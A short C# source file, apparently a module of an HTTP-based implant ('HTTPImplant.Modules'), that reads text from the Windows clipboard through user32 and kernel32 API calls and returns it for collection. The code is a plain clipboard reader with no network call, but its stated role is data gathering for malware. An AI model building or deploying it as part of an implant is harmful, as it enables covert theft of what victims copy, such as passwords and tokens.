using System;
using System.Runtime.InteropServices;
using System.Text;

namespace HTTPImplant.Modules
{
    internal class ClipboardFetcher
    {
        [DllImport("user32.dll")]
        private static extern bool OpenClipboard(IntPtr hWndNewOwner);

        [DllImport("user32.dll")]
        private static extern bool CloseClipboard();

        [DllImport("user32.dll")]
        private static extern IntPtr GetClipboardData(uint uFormat);

        [DllImport("user32.dll")]
        private static extern bool IsClipboardFormatAvailable(uint format);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GlobalLock(IntPtr hMem);

        [DllImport("kernel32.dll")]
        private static extern bool GlobalUnlock(IntPtr hMem);

        [DllImport("kernel32.dll")]
        private static extern int GlobalSize(IntPtr hMem);

        private const uint CF_TEXT = 1;

        public static string GetTextFromClipboard()
        {
            if (!IsClipboardFormatAvailable(CF_TEXT))
                return null;

            try
            {
                if (!OpenClipboard(IntPtr.Zero))
                    return null;

                IntPtr handle = GetClipboardData(CF_TEXT);
                if (handle == IntPtr.Zero)
                    return null;

                IntPtr pointer = GlobalLock(handle);
                if (pointer == IntPtr.Zero)
                    return null;

                int size = GlobalSize(handle);
                byte[] buffer = new byte[size];

                Marshal.Copy(pointer, buffer, 0, size);
                GlobalUnlock(handle);

                return Encoding.Default.GetString(buffer).TrimEnd('\0');
            }
            finally
            {
                CloseClipboard();
            }
        }

        public static string GetData()
        {
            string clipboardText = GetTextFromClipboard();
            return clipboardText;
        }
    }
}
